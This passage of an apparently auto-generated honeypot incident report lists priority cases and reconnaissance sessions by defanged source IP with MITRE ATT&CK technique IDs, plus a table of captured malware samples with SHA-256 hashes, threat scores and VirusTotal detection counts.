| IR-0d031552d7d5 | HIGH | `113.161.222[.]150` | 2026-10-04 06:39 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b501b0323336 | HIGH | `113.161.222[.]150` | 2026-10-04 06:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-60ee78f3a5be | HIGH | `115.178.75[.]242` | 2026-10-04 06:39 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7619173d340f | HIGH | `115.178.75[.]242` | 2026-10-04 06:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-cb817631103d | HIGH | `172.211.56[.]214` | 2026-10-04 06:39 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-6b20f67411ec | HIGH | `172.211.56[.]214` | 2026-10-04 06:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-44794e28ae41 | HIGH | `114.141.59[.]195` | 2026-10-04 06:40 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-bbaf305fae39 | HIGH | `114.141.59[.]195` | 2026-10-04 06:40 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d5159a913e17 | HIGH | `35.195.39[.]91` | 2026-10-04 06:41 | Y | 2 | 0 | `T1078` |
| IR-c60ce4594611 | HIGH | `35.195.39[.]91` | 2026-10-04 06:41 | Y | 1 | 0 | `T1078` |
| IR-32f8e9447e63 | HIGH | `35.195.39[.]91` | 2026-10-04 06:41 | Y | 0 | 0 | `T1078` |
| IR-4261abb72a88 | HIGH | `77.239.124[.]121` | 2026-10-04 06:44 | Y | 4 | 0 | `T1078 · T1083` |
| IR-a05d8af6bd2c | HIGH | `176.53.159[.]196` | 2026-10-04 06:44 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ad4a4bd8ba57 | HIGH | `58.20.201[.]4` | 2026-10-04 06:44 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-b5c11fa54267 | HIGH | `89.125.129[.]161` | 2026-10-04 06:55 | Y | 4 | 0 | `T1078 · T1083` |
| IR-9ff57e1f522b | HIGH | `35.195.134[.]27` | 2026-10-04 07:09 | Y | 2 | 0 | `T1078` |
| IR-886786fd59c3 | HIGH | `120.27.241[.]251` | 2026-10-04 07:09 | Y | 1 | 0 | `T1078 · T1592` |
| IR-b762c3e90a08 | HIGH | `35.195.134[.]27` | 2026-10-04 07:09 | Y | 1 | 0 | `T1078` |
| IR-6569f7e62da4 | HIGH | `35.195.134[.]27` | 2026-10-04 07:09 | Y | 0 | 0 | `T1078` |
| IR-cda552eae6e6 | HIGH | `2.57.122[.]168` | 2026-10-04 07:10 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-437a990a43cf | HIGH | `42.200.66[.]164` | 2026-10-04 07:14 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7061aa9f38bb | HIGH | `42.200.66[.]164` | 2026-10-04 07:14 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5463461817ca | HIGH | `154.18.197[.]35` | 2026-10-04 07:24 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-8b51a9eff4e7 | HIGH | `154.18.197[.]35` | 2026-10-04 07:24 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ef77c5fff8b7 | HIGH | `163.227.96[.]1` | 2026-10-04 07:25 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c6f115346d55 | HIGH | `163.227.96[.]1` | 2026-10-04 07:25 | Y | 0 | 0 | `T1078 · T1592` |
| IR-75b6cad91895 | HIGH | `69.5.7[.]218` | 2026-10-04 07:26 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-10bf5db1da07 | HIGH | `69.5.7[.]218` | 2026-10-04 07:26 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d1ebe6227ee2 | HIGH | `4.184.246[.]230` | 2026-10-04 07:30 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-787cdadf5569 | HIGH | `4.184.246[.]230` | 2026-10-04 07:30 | Y | 0 | 0 | `T1078 · T1592` |
| IR-62d4a0af7d78 | HIGH | `103.167.89[.]222` | 2026-10-04 07:33 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2290913ffe70 | HIGH | `103.167.89[.]222` | 2026-10-04 07:33 | Y | 0 | 0 | `T1078 · T1592` |
| IR-614218aa269f | HIGH | `59.126.224[.]134` | 2026-10-04 07:33 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-454e6df9b40e | HIGH | `59.126.224[.]134` | 2026-10-04 07:33 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a14966da502a | HIGH | `156.232.10[.]218` | 2026-10-04 07:34 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
_… 169 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.199.80[.]137` | **5** | 2026-10-04 02:57 | 2026-10-04 10:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `165.22.105[.]175` | **3** | 2026-10-04 10:01 | 2026-10-04 14:01 | 1m | 0 | `T1592` | 🟢 LOW |
| `115.190.192[.]114` | **2** | 2026-10-04 13:43 | 2026-10-04 14:03 | 4m | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | **2** | 2026-10-04 06:22 | 2026-10-04 08:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | **2** | 2026-10-04 12:59 | 2026-10-04 14:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-10-04 12:17 | 2026-10-04 14:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `165.22.105[.]175` | **2** | 2026-10-04 02:56 | 2026-10-04 04:00 | 1m | 0 | `T1592` | 🟢 LOW |
| `165.22.105[.]175` | **2** | 2026-10-04 06:01 | 2026-10-04 08:01 | 2m | 0 | `T1592` | 🟢 LOW |
| `101.89.144[.]254` | 1 | 2026-10-04 03:24 | 2026-10-04 03:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.96.225[.]252` | 1 | 2026-10-04 07:34 | 2026-10-04 07:35 | 89s | 0 | `T1592` | 🟢 LOW |
| `103.148.235[.]249` | 1 | 2026-10-04 09:50 | 2026-10-04 09:50 | 12s | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]19` | 1 | 2026-10-04 05:53 | 2026-10-04 05:53 | 5s | 0 | `T1592` | 🟢 LOW |
| `106.12.9[.]37` | 1 | 2026-10-04 11:07 | 2026-10-04 11:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]172` | 1 | 2026-10-04 07:44 | 2026-10-04 07:45 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]44` | 1 | 2026-10-04 05:47 | 2026-10-04 05:47 | 8s | 0 | `T1592` | 🟢 LOW |
| `110.166.87[.]119` | 1 | 2026-10-04 03:18 | 2026-10-04 03:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `111.228.12[.]237` | 1 | 2026-10-04 11:21 | 2026-10-04 11:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `111.32.153[.]180` | 1 | 2026-10-04 13:36 | 2026-10-04 13:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `113.137.40[.]250` | 1 | 2026-10-04 10:53 | 2026-10-04 10:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.34.125[.]173` | 1 | 2026-10-04 09:24 | 2026-10-04 09:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.50.178[.]180` | 1 | 2026-10-04 12:39 | 2026-10-04 12:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `119.120.42[.]125` | 1 | 2026-10-04 09:09 | 2026-10-04 09:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `119.148.49[.]82` | 1 | 2026-10-04 08:21 | 2026-10-04 08:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.27.241[.]251` | 1 | 2026-10-04 07:09 | 2026-10-04 07:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.48.178[.]72` | 1 | 2026-10-04 03:07 | 2026-10-04 03:09 | 85s | 0 | `T1592` | 🟢 LOW |
| `120.48.84[.]2` | 1 | 2026-10-04 12:36 | 2026-10-04 12:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.159.71[.]249` | 1 | 2026-10-04 08:20 | 2026-10-04 08:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `121.169.106[.]30` | 1 | 2026-10-04 06:23 | 2026-10-04 06:23 | 16s | 0 | `T1592` | 🟢 LOW |
| `121.169.106[.]30` | 1 | 2026-10-04 08:55 | 2026-10-04 08:55 | 21s | 0 | `T1592` | 🟢 LOW |
| `121.169.106[.]30` | 1 | 2026-10-04 12:01 | 2026-10-04 12:02 | 18s | 0 | `T1592` | 🟢 LOW |
| `123.56.11[.]51` | 1 | 2026-10-04 13:24 | 2026-10-04 13:24 | 5s | 0 | `T1592` | 🟢 LOW |
| `13.72.83[.]77` | 1 | 2026-10-04 07:23 | 2026-10-04 07:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-04 04:59 | 2026-10-04 04:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-04 09:00 | 2026-10-04 09:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-04 11:57 | 2026-10-04 11:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-04 13:58 | 2026-10-04 13:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-10-04 10:45 | 2026-10-04 10:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-10-04 06:55 | 2026-10-04 06:56 | 51s | 0 | `T1592` | 🟢 LOW |
| `14.103.105[.]246` | 1 | 2026-10-04 03:16 | 2026-10-04 03:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]197` | 1 | 2026-10-04 07:36 | 2026-10-04 07:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]198` | 1 | 2026-10-04 03:25 | 2026-10-04 03:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]25` | 1 | 2026-10-04 14:08 | 2026-10-04 14:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `146.120.111[.]5` | 1 | 2026-10-04 06:13 | 2026-10-04 06:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `152.236.14[.]117` | 1 | 2026-10-04 13:12 | 2026-10-04 13:12 | 23s | 0 | `T1592` | 🟢 LOW |
| `153.37.177[.]219` | 1 | 2026-10-04 03:55 | 2026-10-04 03:57 | 97s | 0 | `T1592` | 🟢 LOW |
| `172.104.11[.]4` | 1 | 2026-10-04 13:10 | 2026-10-04 13:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.210.9[.]220` | 1 | 2026-10-04 14:11 | 2026-10-04 14:11 | 9s | 0 | `T1592` | 🟢 LOW |
| `176.65.148[.]112` | 1 | 2026-10-04 12:44 | 2026-10-04 12:44 | 30s | 0 | `T1592` | 🟢 LOW |
| `180.184.183[.]66` | 1 | 2026-10-04 14:17 | 2026-10-04 14:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.57[.]94` | 1 | 2026-10-04 09:58 | 2026-10-04 09:59 | 43s | 0 | `T1592` | 🟢 LOW |
| `181.116.222[.]84` | 1 | 2026-10-04 06:57 | 2026-10-04 06:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `183.232.212[.]207` | 1 | 2026-10-04 12:29 | 2026-10-04 12:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.9.163[.]129` | 1 | 2026-10-04 07:52 | 2026-10-04 07:53 | 28s | 0 | `T1592` | 🟢 LOW |
| `186.239.41[.]74` | 1 | 2026-10-04 04:20 | 2026-10-04 04:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `186.97.203[.]162` | 1 | 2026-10-04 08:30 | 2026-10-04 08:31 | 12s | 0 | `T1592` | 🟢 LOW |
| `190.89.30[.]127` | 1 | 2026-10-04 04:43 | 2026-10-04 04:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-04 04:02 | 2026-10-04 04:02 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `193.37.251[.]71` | 1 | 2026-10-04 12:40 | 2026-10-04 12:40 | 12s | 0 | `T1592` | 🟢 LOW |
| `194.9.14[.]238` | 1 | 2026-10-04 13:00 | 2026-10-04 13:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]218` | 1 | 2026-10-04 08:31 | 2026-10-04 08:31 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]227` | 1 | 2026-10-04 04:19 | 2026-10-04 04:19 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]232` | 1 | 2026-10-04 14:48 | 2026-10-04 14:48 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.88.120[.]62` | 1 | 2026-10-04 06:56 | 2026-10-04 06:56 | 26s | 0 | `T1592` | 🟢 LOW |
| `195.96.139[.]180` | 1 | 2026-10-04 12:44 | 2026-10-04 12:44 | 1s | 0 | `T1592` | 🟢 LOW |
| `199.45.155[.]28` | 1 | 2026-10-04 08:14 | 2026-10-04 08:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]168` | 1 | 2026-10-04 07:17 | 2026-10-04 07:17 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.102.109[.]125` | 1 | 2026-10-04 09:32 | 2026-10-04 09:32 | 9s | 0 | `T1592` | 🟢 LOW |
| `20.98.152[.]40` | 1 | 2026-10-04 08:32 | 2026-10-04 08:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.104.82[.]254` | 1 | 2026-10-04 10:46 | 2026-10-04 10:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.59.127[.]178` | 1 | 2026-10-04 07:20 | 2026-10-04 07:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `203.25.208[.]110` | 1 | 2026-10-04 07:45 | 2026-10-04 07:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `217.23.16[.]238` | 1 | 2026-10-04 10:22 | 2026-10-04 10:22 | 13s | 0 | `T1592` | 🟢 LOW |
| `220.250.52[.]94` | 1 | 2026-10-04 06:37 | 2026-10-04 06:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `221.156.241[.]83` | 1 | 2026-10-04 13:44 | 2026-10-04 13:45 | 16s | 0 | `T1592` | 🟢 LOW |
| `222.186.42[.]108` | 1 | 2026-10-04 09:53 | 2026-10-04 09:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `34.62.182[.]78` | 1 | 2026-10-04 06:06 | 2026-10-04 06:06 | 2s | 0 | `T1592` | 🟢 LOW |
| `35.195.134[.]27` | 1 | 2026-10-04 07:09 | 2026-10-04 07:09 | 3s | 0 | `T1592` | 🟢 LOW |
| `35.195.39[.]91` | 1 | 2026-10-04 06:41 | 2026-10-04 06:41 | 6s | 0 | `T1592` | 🟢 LOW |
| `36.133.53[.]52` | 1 | 2026-10-04 06:26 | 2026-10-04 06:27 | 44s | 0 | `T1592` | 🟢 LOW |
| `36.189.81[.]101` | 1 | 2026-10-04 10:24 | 2026-10-04 10:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `37.52.92[.]165` | 1 | 2026-10-04 10:32 | 2026-10-04 10:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `39.104.64[.]139` | 1 | 2026-10-04 12:56 | 2026-10-04 12:56 | 8s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]214` | 1 | 2026-10-04 13:35 | 2026-10-04 13:35 | 9s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]252` | 1 | 2026-10-04 07:36 | 2026-10-04 07:36 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]71` | 1 | 2026-10-04 14:37 | 2026-10-04 14:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.211[.]97` | 1 | 2026-10-04 06:38 | 2026-10-04 06:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.8[.]221` | 1 | 2026-10-04 14:36 | 2026-10-04 14:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `47.84.112[.]45` | 1 | 2026-10-04 06:09 | 2026-10-04 06:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.251.137[.]156` | 1 | 2026-10-04 10:15 | 2026-10-04 10:16 | 31s | 0 | `T1592` | 🟢 LOW |
| `5.202.169[.]252` | 1 | 2026-10-04 14:35 | 2026-10-04 14:35 | 2s | 0 | `T1592` | 🟢 LOW |
| `58.209.82[.]167` | 1 | 2026-10-04 04:20 | 2026-10-04 04:20 | 1s | 0 | `T1592` | 🟢 LOW |
| `58.221.60[.]25` | 1 | 2026-10-04 09:03 | 2026-10-04 09:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `58.222.86[.]210` | 1 | 2026-10-04 04:20 | 2026-10-04 04:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]201` | 1 | 2026-10-04 10:03 | 2026-10-04 10:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]66` | 1 | 2026-10-04 04:55 | 2026-10-04 04:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]52` | 1 | 2026-10-04 10:42 | 2026-10-04 10:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]100` | 1 | 2026-10-04 09:52 | 2026-10-04 09:53 | 22s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]195` | 1 | 2026-10-04 05:56 | 2026-10-04 05:56 | 19s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]37` | 1 | 2026-10-04 05:54 | 2026-10-04 05:54 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]37` | 1 | 2026-10-04 05:00 | 2026-10-04 05:00 | 16s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]69` | 1 | 2026-10-04 04:57 | 2026-10-04 04:57 | 16s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]99` | 1 | 2026-10-04 07:58 | 2026-10-04 07:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]226` | 1 | 2026-10-04 05:55 | 2026-10-04 05:55 | 27s | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]90` | 1 | 2026-10-04 05:56 | 2026-10-04 05:56 | 16s | 0 | `T1592` | 🟢 LOW |
| `66.228.62[.]150` | 1 | 2026-10-04 03:43 | 2026-10-04 03:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `68.235.251[.]87` | 1 | 2026-10-04 03:40 | 2026-10-04 03:40 | 10s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]212` | 1 | 2026-10-04 12:05 | 2026-10-04 12:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]221` | 1 | 2026-10-04 12:05 | 2026-10-04 12:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `71.6.146[.]130` | 1 | 2026-10-04 03:42 | 2026-10-04 03:42 | 1s | 0 | `T1592` | 🟢 LOW |
| `72.229.136[.]74` | 1 | 2026-10-04 14:03 | 2026-10-04 14:03 | 10s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]121` | 1 | 2026-10-04 06:44 | 2026-10-04 06:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-04 03:41 | 2026-10-04 03:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-04 07:13 | 2026-10-04 07:13 | 1s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]153` | 1 | 2026-10-04 09:14 | 2026-10-04 09:14 | 8s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]41` | 1 | 2026-10-04 11:05 | 2026-10-04 11:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.94.95[.]109` | 1 | 2026-10-04 08:02 | 2026-10-04 08:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `84.54.73[.]79` | 1 | 2026-10-04 11:47 | 2026-10-04 11:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.106.223[.]90` | 1 | 2026-10-04 07:00 | 2026-10-04 07:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]9` | 1 | 2026-10-04 13:28 | 2026-10-04 13:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `86.102.111[.]211` | 1 | 2026-10-04 14:13 | 2026-10-04 14:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `89.125.129[.]161` | 1 | 2026-10-04 06:55 | 2026-10-04 06:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.248.172[.]9` | 1 | 2026-10-04 11:04 | 2026-10-04 11:05 | 31s | 0 | `T1592` | 🟢 LOW |
| `91.205.197[.]20` | 1 | 2026-10-04 05:50 | 2026-10-04 05:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.225.162[.]230` | 1 | 2026-10-04 05:31 | 2026-10-04 05:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `91.234.26[.]195` | 1 | 2026-10-04 09:11 | 2026-10-04 09:12 | 14s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]6` | 1 | 2026-10-04 05:33 | 2026-10-04 05:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]6` | 1 | 2026-10-04 07:38 | 2026-10-04 07:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]6` | 1 | 2026-10-04 14:32 | 2026-10-04 14:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `95.174.100[.]64` | 1 | 2026-10-04 11:57 | 2026-10-04 11:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `95.57.236[.]31` | 1 | 2026-10-04 04:35 | 2026-10-04 04:35 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
